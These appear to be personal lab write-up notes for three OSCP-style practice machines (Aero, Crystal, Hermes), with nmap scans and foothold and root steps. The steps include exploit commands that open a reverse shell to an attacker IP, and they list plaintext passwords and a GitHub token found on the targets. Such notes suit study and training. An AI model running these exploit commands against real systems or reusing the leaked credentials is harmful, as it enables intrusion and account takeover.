# Aero .143
```
Host is up (0.039s latency).
Not shown: 65525 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Test Page for the Nginx HTTP Server on Fedora
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  http       Apache httpd 2.4.41
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2113
|_    RProcessStartupPacket
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3003-TCP:V=7.94SVN%I=7%D=9/2%Time=66D5C251%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPR
SF:equest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerC
SF:ookie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDStrin
SF:g,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.94SVN%I=7%D=9/2%Time=66D5C24C%P=x86_64-pc-linux-gnu%r(
SF:SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20front
SF:end\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x2
SF:03\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold
1. found api endpoint ``` http://aero/api/heartbeat ``` -> aerospike is running
2. https://github.com/b4ny4n/CVE-2020-13151/tree/master 
3. ``` python3 49067.py --ahost 192.168.181.143 --aport 3000 --netcatshell --lhost=192.168.45.204 --lport=80 ```

## Root
1. found screen 4.5 vulnable (https://www.exploit-db.com/exploits/41154)
2. follow the exploit: https://github.com/jebidiah-anthony/htb_flujab (part 4)

# Crystal .144
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git: 
|   192.168.240.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-title: Home
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold
1. found password in git log (folder under domain/.git/ and dumped)
```
    ssh stuart@Crystal
    BreakingBad92
```

## Root 
1. Found zip file in opt/backup
2. found chloe password in configuration.php
```
su chloe 
Ee24zIK4cDhJHL4H
```

# Hermes .145
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Samuel's Personal Site
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-07T10:40:55+00:00; -4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2024-09-07T10:40:15+00:00
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2024-05-30T16:22:00
|_Not valid after:  2024-11-29T16:22:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.94SVN%I=7%D=9/7%Time=66DC2CFA%P=x86_64-pc-linux-gnu%r(
SF:NULL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20w
SF:indows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r
SF:(HTTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"syst
SF:em\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\
SF:n")%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSSta
SF:tusRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20
SF:windows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n
SF:")%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSess
SF:ionReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20win
SF:dows\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X
SF:11Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"sys
SF:tem\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\
SF:n\n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq
SF:,14,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows
SF:\x206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termi
SF:nalServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaR
SF:MI,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-
SF:sql-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x
SF:206\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-07T10:40:15
|_  start_date: N/A
|_clock-skew: mean: -4s, deviation: 0s, median: -4s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

## Foothold
1. Found mouse wifi 1.7.8.5 is running from SNMP UDP scan
2. run exploit ``` python3 50972.py Hermes 192.168.45.194 shell.exe  ```

## Root
1. found putty session ``` ����������͹ Putty Sessions
    RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
 ```
2. try rdp / smb fuck w/ netexec success then 
    ```
     xfreerdp /v:hermes /u:zachary /p:"Th3R@tC@tch3r" /cert-ignore
    ```